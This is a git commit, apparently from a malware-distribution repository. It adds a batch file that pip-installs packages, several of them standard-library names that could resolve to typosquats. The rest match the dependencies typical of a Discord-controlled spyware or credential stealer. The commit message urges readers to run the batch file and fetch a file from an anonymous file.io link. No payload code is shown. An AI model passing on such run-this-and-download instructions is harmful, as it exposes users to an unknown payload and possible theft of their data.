1762bdeaf6bffbd51c74d5ff3694f1ca372e703c
fil12few <i8w2o1@gmail.com>
2024-09-18 12:59:55 -0700

    https://file.io/WP5NQoR8in7D
    u must run the bat file and download the one in the link

---
+++ downloadrequest.bat
@@ -0,0 +1,23 @@
+@echo off
+echo Installing required Python packages...
+pip install os
+pip install discord.py
+pip install subprocess.run
+pip install pyautogui
+pip install opencv-python
+pip install numpy
+pip install shutil
+pip install base64
+pip install sqlite3
+pip install opencv-python
+pip install pypiwin32
+pip install pycryptodome
+pip install requests
+pip install csv
+pip install json
+pip install time
+pip install logging
+pip install re
+
+echo Installation complete.
+pause
